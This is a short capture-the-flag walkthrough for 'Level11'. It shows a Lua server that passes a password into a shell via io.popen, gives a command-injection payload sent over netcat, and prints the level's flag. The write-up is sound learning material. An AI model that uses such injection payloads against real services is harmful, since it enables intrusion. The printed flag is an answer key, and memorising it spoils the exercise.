# Level11

In Level11, you are presented with a Lua script named `./level11.lua` and nothing else. Upon examining the script, you determine that it performs the following actions:

1. Creates a server on `localhost` at port `5151`.
2. Waits for a client to connect to this server.
3. Prompts the connected client for a password.
4. Hashes the password.
5. Compares the hashed password to a stored hash.
6. Displays a message indicating whether the hashes are equal.

One line in the script stands out in particular:

lua
prog = io.popen("echo "..pass.." | sha1sum", "r")


It appears that the script's method of hashing the password is to insert the provided password into a string of commands, which it then feeds to a subshell. This approach has security implications and creates an opportunity for exploitation.

To exploit the script, you open a client to communicate with it. Since the script is already running, you don't need to start it manually:


nc localhost 5151


Once connected, the script prompts you for a password. You can try exploiting it by providing the following input:


; getflag > /tmp/flag ; echo hello


This input is crafted to be executed as the following command:


echo ; getflag > /tmp/flag ; echo hello | sha1sum


## The flag

After providing the input, the script executes the command, and you can retrieve the flag by running:


cat /tmp/flag


This displays the Level11 flag:


fa6v5ateaw21peobuub8ipe6s
